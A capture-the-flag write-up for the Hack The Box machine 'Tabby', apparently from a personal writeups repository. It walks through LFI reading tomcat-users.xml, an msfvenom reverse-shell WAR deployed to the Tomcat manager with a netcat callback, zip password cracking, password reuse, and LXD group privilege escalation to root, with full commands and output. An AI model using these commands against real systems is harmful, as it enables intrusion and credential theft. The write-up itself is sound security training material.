## Default Information
IP Address: 10.10.10.140\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.194    tabby.htb
```

### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.194 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-11-20 10:02:48 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 8080/tcp on 10.10.10.194                                  
Discovered open port 80/tcp on 10.10.10.194                                    
Discovered open port 22/tcp on 10.10.10.194
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port. From the output, we know that there are 2 
ports running web services, namely port 80 and port 8080.

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | Open |
| 80	| HTTP | Apache httpd 2.4.41 ((Ubuntu)) | Open |
| 8080	| HTTP | Apache Tomcat | Open |

However, we are also able to obtain an email address of interest (sales@megahosting.htb) from the nmap output. As such, we will also add megahosting.htb to our /etc/hosts file.

```
10.10.10.194    megahosting.htb tabby.htb
```

### Gobuster

We will first use Gobuster to enumerate for any common endpoints of http://tabby.htb on port 80. From the output, there is an interesting /new.php endpoint that returns a size 
of 0

```
http://10.10.10.194:80/Readme.txt           (Status: 200) [Size: 1574]
http://10.10.10.194:80/assets               (Status: 301) [Size: 313] [--> http://10.10.10.194/assets/]
http://10.10.10.194:80/favicon.ico          (Status: 200) [Size: 766]
http://10.10.10.194:80/files                (Status: 301) [Size: 312] [--> http://10.10.10.194/files/]
http://10.10.10.194:80/index.php            (Status: 200) [Size: 14175]
http://10.10.10.194:80/news.php             (Status: 200) [Size: 0]
```

Afterwards, we will use Gobuster to enuemerate for common endpoints of http;//tabby.htb on port 8080

```
http://10.10.10.194:8080/docs                 (Status: 302) [Size: 0] [--> /docs/]
http://10.10.10.194:8080/examples             (Status: 302) [Size: 0] [--> /examples/]
http://10.10.10.194:8080/host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
http://10.10.10.194:8080/index.html           (Status: 200) [Size: 1895]
http://10.10.10.194:8080/index.html           (Status: 200) [Size: 1895]
http://10.10.10.194:8080/manager              (Status: 302) [Size: 0] [--> /manager/]
```

### Web-content discovery
Visiting http://tabby.htb:80, we are able to find a /news.php that redirects to http://megahosting.htb/news.php?file=statement
![news.php page](https://github.com/joelczk/writeups/blob/main/HTB/Images/Tabby/news.png)

## Exploit
### LFI
Capturing the request via Burp Suite, we realize that there is a file parameter that might possibly be vulnerable to LFI. Using ```../../../../etc/passwd``` worked as we are 
able to view the file contents of /etc/passwd file. From this output alone, even though we are unable to obtain any credentials that is of any use to use, we are able to find a
few users that might be of use to use (tomcat, lxd, ash)

![LFI Burp](https://github.com/joelczk/writeups/blob/main/HTB/Images/Tabby/lfi_burp.png)

Now, let's try to find a configuration file that can leak potential credentials. Viewing http://megahosting.htb:8080, we can see that users are defined in ```/etc/tomcat9/tomcat-users.xml``` and CATALINA_HOME as well as CATALINA_BASE are defined in tomcat9. However, we were unable to obtain the tomcat-users.xml file from all of the above paths listed.

Upon some research, I found this [site](https://talk.openmrs.org/t/configuring-apache-tomcat-9/323790) that tells me that the tomcat-users.xml file can be found at ```/usr/share/tomcat9/etc/tomcat-users.xml```. Using ```/usr/share/tomcat9/etc/tomcat-users.xml``` we can then exploit the LFI to view tomcat-users.xml file. From the output, we are able to obtain the credentials for the user (tomcat:$3cureP4s5w0rd123!), and also we know that this user has admin privileges and manager privileges on the tomcat interface at port 8080

![tomcat-users.xml file](https://github.com/joelczk/writeups/blob/main/HTB/Images/Tabby/tomcat_users_file.png)

### Obtaining reverse shell

Let us first create a reverse shell payload in the form of a .war file using msfvenom, and afterwards we will upload it onto the Apache Tomcat site at port 8080
```
┌──(kali㉿kali)-[~/Desktop]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.4 LPORT=4000 -f war -o revshell.war
Payload size: 1098 bytes
Final size of war file: 1098 bytes
Saved as: revshell.war
┌──(kali㉿kali)-[~/Desktop]
└─$ curl --upload-file exploit.war -u 'tomcat:$3cureP4s5w0rd123!' "http://megahosting.htb:8080/manager/text/deploy?path=/exploit"
OK - Deployed application at context path [/exploit]
```

Next, we just have to visit http://megahosting.htb:8080/exploit to trigger the reverse shell. Afterwards, all we have to do is to stabilize the reverse shell.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.194] 47118
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
which python3
/usr/bin/python3
python3 -c "import pty; pty.spawn('/bin/bash')"
tomcat@tabby:/var/lib/tomcat9$ ^Z
[1]+  Stopped                 nc -nlvp 443

┌──(kali㉿kali)-[~]
└─$ stty raw -echo && fg
nc -nlvp 443

tomcat@tabby:/var/lib/tomcat9$ 
tomcat@tabby:/var/lib/tomcat9$ export TERM=xterm
tomcat@tabby:/var/lib/tomcat9$ stty cols 132 rows 34
tomcat@tabby:/var/lib/tomcat9$ 
```

However, we do not have the permissions to view the user flag located at /home/ash

```
tomcat@tabby:/var/lib/tomcat9$ cat /home/ash/user.txt
cat: /home/ash/user.txt: Permission denied
```
### Privilege Escalation to Ash

Using Linpeas, we realize that there is an interesting backup.zip file in the /var/www/html/files directory

```
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 ash ash 8716 Jun 16  2020 /var/www/html/files/16162020_backup.zip               
-rw-r--r-- 1 root root 2743 Apr 23  2020 /etc/apt/sources.list.curtin.old
-rw-r--r-- 1 root root 11070 May 19  2020 /usr/share/info/dir.old
```

Next, we will extract the backup zip file to our local machine. Afterwards, we will use zip2john to generate the hash of the zip file and we will proceed to use John the Ripper to obtain the password (admin@it) to the zip file. 

```
┌──(kali㉿kali)-[~/Desktop]
└─$ zip2john 16162020_backup.zip > hash.txt
16162020_backup.zip/var/www/html/assets/ is not encrypted!
ver 1.0 16162020_backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/favicon.ico PKZIP Encr: 2b chk, TS_chk, cmplen=338, decmplen=766, crc=282B6DE2
ver 1.0 16162020_backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6
ver 1.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/logo.png PKZIP Encr: 2b chk, TS_chk, cmplen=2906, decmplen=2894, crc=2F9F45F
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/news.php PKZIP Encr: 2b chk, TS_chk, cmplen=114, decmplen=123, crc=5C67F19E
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/Readme.txt PKZIP Encr: 2b chk, TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

┌──(kali㉿kali)-[~/Desktop]
└─$ john hash.txt --wordlist=/home/kali/Desktop/pentest/wordlist/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (16162020_backup.zip)
1g 0:00:00:00 DONE (2021-11-20 20:35) 1.408g/s 14595Kp/s 14595Kc/s 14595KC/s adnaws..adena2010
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Using the password to view the files, it seem that the files inside the zip files do not provide any valuable information. However, I though of password re-use and tried to escalate to ash user using the password obtained in the previous step, which was successful.
```
tomcat@tabby:/var/www/html/files$ su ash
Password: 
ash@tabby:/var/www/html/files$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
ash@tabby:/var/www/html/files$ 
```
### Obtaining user flag

```
ash@tabby:/var/www/html/files$ cat /home/ash/user.txt
<Redacted user flag>
ash@tabby:/var/www/html/files$
```

### Privilege Escalation to root

We noticed that ash is a part of the lxd group, which makes it vulnerable to the lxd privilege escalation.

```
ash@tabby:~$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

First, let us check if there are any containers being mounted on the root filesystem. From the output, there is containers mounted yet. 

```
ash@tabby:~$ /snap/bin/lxc list
If this is your first time running LXD on this machine, you should also run: lxd init
To start your first instance, try: lxc launch ubuntu:18.04

+------+-------+------+------+------+-----------+
| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |
+------+-------+------+------+------+-----------+
```

Next, we will clone the repository containing the alpine image and build the alpine image on our local machine. This creates a .tar.gz folder with all the files necessary to make an Alpine Linux container.

```
git clone https://github.com/saghul/lxd-alpine-builder
sudo ./build-alpine
```

We will then upload the .tar.gz file onto the target server. Afterwards, we will import the image into the server

```
ash@tabby:~$ /snap/bin/lxc image import ./alpine*.tar.gz --alias myimage
Image imported with fingerprint: 0c970475ea88cf145739696d706ab0a161932827fd9067b42a1fa307d6ca2a7a
```

Next, we have to initialize the container using ```lxd init```. We would use all the default settings for this.

```
ash@tabby:~$ /snap/bin/lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: no
Do you want to configure a new storage pool? (yes/no) [default=yes]: yes
Name of the new storage pool [default=default]: default
Name of the storage backend to use (dir, lvm, zfs, ceph, btrfs) [default=zfs]: zfs
Create a new ZFS pool? (yes/no) [default=yes]: yes
Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]: no
Size in GB of the new loop device (1GB minimum) [default=5GB]: 5GB
Would you like to connect to a MAAS server? (yes/no) [default=no]: no
Would you like to create a new local network bridge? (yes/no) [default=yes]: yes
What should the new bridge be called? [default=lxdbr0]: lxdbr0
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: auto
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: auto
Would you like the LXD server to be available over the network? (yes/no) [default=no]: no
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] yes
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: no
```

Next, we would have to run the image and mount /root into the image

```
ash@tabby:~$ /snap/bin/lxc init myimage mycontainer -c security.privileged=true
Creating mycontainer
ash@tabby:~$ /snap/bin/lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to mycontainer
```

Using ```lxc list```, we can see that the new container is now running. All we have to do is to execute /bin/sh using the new container.
```
ash@tabby:~$ /snap/bin/lxc list
+-------------+---------+----------------------+----------------------------------------------+-----------+-----------+
|    NAME     |  STATE  |         IPV4         |                     IPV6                     |   TYPE    | SNAPSHOTS |
+-------------+---------+----------------------+----------------------------------------------+-----------+-----------+
| mycontainer | RUNNING | 10.136.67.205 (eth0) | fd42:ffa:82ec:5062:216:3eff:feaa:ebf7 (eth0) | CONTAINER | 0         |
+-------------+---------+----------------------+----------------------------------------------+-----------+-----------+
ash@tabby:~$ /snap/bin/lxc exec mycontainer /bin/sh
~ # id
uid=0(root) gid=0(root)
```
In the previous commands, we have mounted the filesystem to /mnt/root. We would have to navigate to /mnt/root directory to view our mounted files.

```
# cd /mnt/root
/mnt/root # ls
bin         dev         lib         libx32      mnt         root        snap        tmp
boot        etc         lib32       lost+found  opt         run         srv         usr
cdrom       home        lib64       media       proc        sbin        sys         var
```

### Obtaining root flag

```
/mnt/root # cat root/root.txt
<Redacted root flag>
```


## Post-Exploitation
### LXD Privilege Escalation

One thing that we noticed after when we are in the lxd container is that, we can check whether we are in the mounted file system using etc/hostname command. As shown below, we
can see that the output of etc/hostname changes to that of our original filesystem when we are in the mounted filesystem directory.

```
/mnt/root # cat etc/hostname
tabby
/mnt/root # cd
~ # cat /etc/hostname
mycontainer
```

### CVE-2020-9484
This exploit failed to work on our target website mainly because index.jsp cannot be found on the website. 

```
┌──(kali㉿kali)-[~]
└─$ curl 'http://10.10.10.194:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy'

<!doctype html><html lang="en"><head><title>HTTP Status 404 – Not Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 – Not Found</h1><hr class="line" /><p><b>Type</b> Status Report</p><p><b>Message</b> &#47;index.jsp</p><p><b>Description</b> The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.</p><hr class="line" /><h3>Apache Tomcat/9.0.31 (Ubuntu)</h3></body></html> 
```
